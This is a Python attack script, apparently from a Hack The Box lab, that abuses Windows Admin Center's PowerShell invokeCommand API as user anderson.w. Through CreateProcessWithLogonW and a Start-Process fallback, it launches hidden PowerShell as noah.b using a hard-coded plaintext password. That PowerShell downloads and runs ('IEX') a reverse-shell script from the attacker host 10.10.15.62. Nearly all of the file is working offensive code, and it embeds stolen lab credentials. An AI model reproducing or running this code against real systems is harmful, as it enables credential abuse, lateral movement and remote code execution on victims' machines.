#!/usr/bin/env python3
"""From anderson WAC: CreateProcessWithLogonW noah + IEX download reverse shell."""
import sys
sys.path.insert(0, "/home/kali/Desktop/htb/danglingtree/scripts")
from wac_ps import WAC

LHOST = "10.10.15.62"
PORT = "4446"
URL = f"http://{LHOST}:8000/noahrev.ps1"

script = rf'''
$ErrorActionPreference='Continue'
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class RV3 {{
  [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
  public static extern bool CreateProcessWithLogonW(string user,string domain,string pass,int logonFlags,string app,string cmd,int flags,IntPtr env,string cwd,ref SI si,out PI pi);
  [DllImport("kernel32.dll", SetLastError=true)] public static extern bool CloseHandle(IntPtr h);
  [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
  public struct SI {{ public int cb; public string a,b,c; public int d,e,f,g,h,i,j,k; public short l,m; public IntPtr n,o,p,q; }}
  [StructLayout(LayoutKind.Sequential)]
  public struct PI {{ public IntPtr hp,ht; public int pid,tid; }}
}}
"@
$ps='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
$cmd = '"'+$ps+'" -NoP -w Hidden -c "IEX((New-Object Net.WebClient).DownloadString(''{URL}''))"'
$si=New-Object RV3+SI; $si.cb=[Runtime.InteropServices.Marshal]::SizeOf($si); $pi=New-Object RV3+PI
$ok=[RV3]::CreateProcessWithLogonW('noah.b','danglingtree','RiverDragon#Storm25',1,$ps,$cmd,0x08000000,[IntPtr]::Zero,'C:\Windows\Temp',[ref]$si,[ref]$pi)
"ok=$ok err=$([Runtime.InteropServices.Marshal]::GetLastWin32Error()) pid=$($pi.pid)"
try {{
  $cred=New-Object PSCredential('danglingtree\noah.b',(ConvertTo-SecureString 'RiverDragon#Storm25' -AsPlainText -Force))
  $p=Start-Process -FilePath $ps -WorkingDirectory 'C:\Windows\Temp' -ArgumentList @('-NoP','-w','Hidden','-c',"IEX((New-Object Net.WebClient).DownloadString('{URL}'))") -Credential $cred -PassThru -WindowStyle Hidden -EA Stop
  "StartProcess pid=$($p.Id)"
}} catch {{ "StartProcess ERR $($_.Exception.Message)" }}
'''

w = WAC(user="anderson.w", password="R3dT3am@Acc3ss#01")
body = {"properties": {"script": script, "command": None, "module": None, "state": "ready"}}
rr = w.s.post(w.base + "/api/nodes/localhost/features/powershellApi/invokeCommand", headers=w.headers, json=body, timeout=60)
j = rr.json()
print("completed", j.get("completed"))
for x in j.get("results") or []:
    if isinstance(x, str):
        print(x)
    elif not isinstance(x, bool):
        print(x)
if j.get("exception"):
    print("EXC", j["exception"][:400])
